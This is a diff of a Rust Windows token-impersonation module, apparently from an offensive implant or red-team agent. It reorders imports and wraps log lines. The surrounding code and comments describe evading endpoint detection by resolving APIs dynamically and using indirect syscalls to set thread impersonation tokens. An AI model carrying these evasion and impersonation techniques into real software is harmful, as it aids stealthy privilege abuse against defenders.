@@ -44,16 +44,18 @@
 
 #![cfg(all(windows, feature = "token-impersonation"))]
 
-use common::lock::MutexExt;
+use crate::win_types::HANDLE;
+use crate::win_types::SECURITY_ATTRIBUTES;
 use anyhow::{anyhow, Context, Result};
+use common::lock::MutexExt;
 use rand::Rng;
 use std::collections::HashMap;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Mutex, OnceLock};
-use crate::win_types::SECURITY_ATTRIBUTES;
-use windows_sys::Win32::Security::{SecurityImpersonation, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY};
-use crate::win_types::HANDLE;
 use windows_sys::Win32::Security::TokenImpersonation;
+use windows_sys::Win32::Security::{
+    SecurityImpersonation, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
+};
 /// Minimal token access for impersonation: TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY.
 ///
 /// P2-32: This is the minimum required set — no broad TOKEN_ALL_ACCESS mask.
@@ -94,11 +96,11 @@ unsafe fn get_last_error() -> u32 {
 use crate::win_types::INVALID_HANDLE_VALUE;
 // All function imports removed — resolved dynamically via pe_resolve or indirect
 // syscalls to eliminate IAT entries visible to EDR. Type-only imports retained.
-use crate::win_types::{DWORD, LPVOID};
 use crate::win_types::NTSTATUS;
+use crate::win_types::{DWORD, LPVOID};
 use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
-use windows_sys::Win32::System::Pipes::{PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE};
 use windows_sys::Win32::Security::TOKEN_TYPE;
+use windows_sys::Win32::System::Pipes::{PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE};
 
 // ── Dynamic API resolution (IAT elimination) ────────────────────────────────
 //
@@ -235,7 +237,9 @@ unsafe fn nt_set_impersonation_token(token_handle: HANDLE) -> i32 {
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            tracing::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!(
+                "token_impersonation: failed to resolve NtSetInformationThread SSN: {e}"
+            );
             return STATUS_ACCESS_DENIED;
         }
     };
@@ -378,7 +382,9 @@ unsafe fn nt_set_thread_impersonation_token(thread_handle: HANDLE, token_handle:
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            tracing::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!(
+                "token_impersonation: failed to resolve NtSetInformationThread SSN: {e}"
+            );
             return STATUS_ACCESS_DENIED;
         }
     };
@@ -538,7 +544,9 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
         if let Some(free_fn) = local_free_fn {
             unsafe { free_fn(sid_str as *mut _) };
         } else {
-            tracing::warn!("token_impersonation: LocalFree not resolved, leaking SID string buffer");
+            tracing::warn!(
+                "token_impersonation: LocalFree not resolved, leaking SID string buffer"
+            );
         }
         s
     } else {
